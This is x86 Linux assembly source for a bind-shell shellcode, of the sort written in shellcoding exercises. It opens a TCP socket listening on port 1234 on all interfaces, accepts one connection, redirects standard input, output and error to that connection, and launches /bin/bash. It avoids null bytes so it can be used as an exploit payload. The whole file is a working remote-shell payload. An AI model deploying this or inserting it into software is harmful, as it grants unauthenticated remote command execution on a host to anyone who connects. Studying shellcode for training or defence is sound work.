global _start

section .text

_start:
	;---------------------------------------
	; socket syscall
	xor ecx,ecx     ; ecx=0
	mov eax,ecx
	mov al,102	; socket syscall
	mov ebx,ecx
	mov bl,1	; subcall

	push ecx	; argument protocol (0)
	push 1		; argument type SOCK_STREAM
	push 2		; argument domain AF_INET
	mov ecx,esp	; adress of arguments

	int 0x80	; execute syscall, -> filedescriptor in eax
	mov edx,eax	; save filedescriptor to edx

	;---------------------------------------
	; bind syscall
	xor ecx,ecx
	mov eax,ecx
        mov al,102     ; socket syscall
        mov ebx,ecx
	mov bl,2       ; subcall

	;sockaddr struct
	push ecx		; INADDR_ANY (0)
	push WORD 0xD204	; Port: 1234 = 0x04D2, reverse 0xD204
	push WORD 2		; AF_INET
	mov ecx,esp	; save pointer to struct sockaddr

	;push arguments
	push 16		; addrlength
	push ecx	; sockaddr address
	push edx	; filedescriptor

	mov ecx,esp     ; adress of arguments

	int 0x80        ; execute syscall


	;---------------------------------------
	; listen syscall
	xor ecx,ecx
	mov eax,ecx
 	mov al,102     ; socket syscall
        mov ebx,ecx
	mov bl,4       ; subcall

	;arguments
	push 5		; backlog
	push edx	; filedescriptor 
	mov ecx,esp     ; adress of arguments

	int 0x80        ; execute syscall


        ;---------------------------------------
	; accept syscall
	xor ecx,ecx
	mov eax,ecx
	mov al,102     ; socket syscall
        mov ebx,ecx
	mov bl,5       ; subcall

	push ecx	; socklen 0
	push ecx	; sockaddr 0
	push edx	; filedescriptor
        mov ecx,esp     ; adress of arguments

        int 0x80        ; execute syscall

	mov edx,eax	; client fd


        ;---------------------------------------
	; dup2 syscall stdin
	xor eax,eax
	mov al,63	; dup2 syscall

	mov ebx,edx	; fd socket
	xor ecx,ecx	; stdin 0

        int 0x80        ; execute syscall



        ;---------------------------------------
        ; dup2 syscall stdout

	xor eax,eax
        mov al,63      ; dup2 syscall

        mov ebx,edx     ; fd socket
        xor ecx,ecx
	mov cl,1       ; stdout

        int 0x80        ; execute syscall


        ;---------------------------------------
        ; dup2 syscall stderr
	xor eax,eax
        mov al,63      ; dup2 syscall

        mov ebx,edx     ; fd socket
        xor ecx,ecx
	mov cl,2       ; stderr

        int 0x80        ; execute syscall



        ;---------------------------------------
        ; execve /bin/bash
	xor eax,eax
        mov al,11      ; dup2 syscall

	; push ////bin/bash on stack in reverse
	xor ecx,ecx
	push ecx	; null byte
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f

	mov ebx,esp	; /bin/bash
	xor ecx,ecx
	xor edx,edx


        int 0x80        ; execute syscall

